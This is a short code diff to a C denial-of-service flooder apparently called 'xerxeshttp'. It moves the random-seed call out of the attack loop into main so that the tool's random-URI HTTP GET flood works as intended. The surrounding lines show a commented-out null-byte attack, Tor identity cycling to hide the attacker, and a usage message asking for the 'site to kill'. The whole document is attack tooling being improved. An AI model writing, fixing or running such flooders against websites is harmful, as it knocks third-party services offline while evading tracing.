@@ -128,7 +128,6 @@ void http_attack(char *host, char *port, int id) {
 			/* Null byte attack: r=write(sockets[x], "\0", 1); */
 
 			/* HTTP get /random-uri Attack */
-                        srand(time(NULL));
                         char *string = createStr();
                         char httpbuf[1024];
 			/* Get /randomshiteverythread?lol=kektheplanet */
@@ -175,6 +174,8 @@ void _tcp_cycle_identity() {
 
 
 int main(int argc, char **argv) {
+//it goes here
+	srand(time(NULL));
 	int x;
 	if(argc !=3) {
 		printf("xerxeshttp Usage Summary:\n%s [site to kill] [port, 80 is best]\nThis version uses http get requests instead of nulls.\nYour tor identity has been reset\n\n", argv[0]);
